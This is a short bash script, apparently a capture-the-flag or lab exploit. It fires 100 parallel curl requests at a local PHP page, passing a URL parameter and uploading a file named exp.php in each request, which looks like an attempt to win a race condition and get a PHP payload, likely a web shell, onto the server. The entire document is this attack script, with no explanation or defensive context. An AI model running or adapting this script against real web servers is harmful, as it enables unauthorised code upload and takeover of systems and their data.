#!/bin/bash
#

for i in `seq 1 100`
do {
	curl http://127.0.0.1:8002/index.php\?orange\=http://google.com -F file=@exp.php
} &
done